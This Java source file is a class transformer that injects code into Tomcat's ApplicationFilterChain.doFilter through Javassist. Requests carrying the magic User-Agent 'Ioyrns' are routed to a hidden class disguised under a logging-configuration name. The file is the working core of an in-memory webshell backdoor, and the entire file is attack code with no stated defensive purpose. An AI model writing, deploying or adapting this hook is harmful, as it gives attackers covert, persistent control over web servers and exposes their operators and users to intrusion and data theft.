import javassist.*;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classFileBuffer) {

        if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
            return null;
        }

        try {
            ClassPool pool = ClassPool.getDefault();
            pool.appendClassPath(new LoaderClassPath(loader));

            CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
            CtMethod doFilter = cc.getDeclaredMethod("doFilter");

            doFilter.insertBefore(
                    "{ " +
                            "    System.out.println(\"into doFilter\");" +
                            "    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;" +
                            "    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;" +
                            "    String ua = req.getHeader(\"User-Agent\");" +
                            "    if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
                            "        try {" +
                            "            ClassLoader cl = this.getClass().getClassLoader();" +
                            "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);" +
                            "            Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
                            "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                            "            Object obj = m.invoke(null, new Object[]{ cl });" +
                            "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
                            "            exec.invoke(obj, new Object[]{ req, res });" +
                            "        } catch (Throwable t) { System.out.println(\"ApplicationFilterChain exception!!!\");t.printStackTrace(); }" +
                            "        return;" +
                            "    }" +
                            "}"
            );


            System.out.println("[+] Hooked doFilter, caching Log4jConfigPdFilter instance.");
            byte[] bytecode = cc.toBytecode();
            cc.detach();
            return bytecode;

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}